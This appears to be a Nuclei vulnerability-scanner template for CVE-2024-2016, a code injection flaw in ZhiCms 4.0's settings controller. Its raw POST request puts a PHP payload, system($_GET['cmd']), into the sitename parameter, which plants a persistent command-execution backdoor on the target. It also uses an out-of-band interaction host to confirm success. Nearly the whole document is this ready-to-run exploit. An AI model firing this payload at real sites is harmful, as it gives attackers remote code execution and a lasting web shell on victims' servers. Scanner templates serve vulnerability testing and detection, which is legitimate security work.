id: zhicms-40-rce
info:
  name: "ZhiCms 4.0 setcontroller.php index函数 sitename参数代码注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    app/manage/controller/setcontroller.php 中 index 函数存在代码注入漏洞，通过 sitename 参数可触发远程代码执行。该漏洞的 CVE 编号为 CVE-2024-2016，披露日期为 2024-04-30。攻击者无需身份验证即可远程利用此漏洞执行任意代码。

  reference:
  - CVE-2024-2016
  tags: ZhiCms
http:
- raw:
  - |
    POST /index.php?r=manage/set/index HTTP/1.1
    Host: {{Hostname}}
    Accept: application/json, text/javascript, */*; q=0.01
    X-Requested-With: XMLHttpRequest
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: PHPSESSID=96d562012a5fde8577cbd6ea765d69ed
    Connection: close

    sitename=')%3Bsystem(%24_GET%5B'cmd'%5D)%3B%2F*&hosturl=&logo=public%2Fweb%2Fimages%2Flogoh2014r.png&ewm=public%2Fweb%2Fimages%2Flogoh2014r.png&appkey=&secretKey=&pid=&apiurl=https%3A%2F%2F{{interactsh-url}}%2F&code=&zhuan=0&download=
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: interactsh_protocol
    words:
    - "dns"
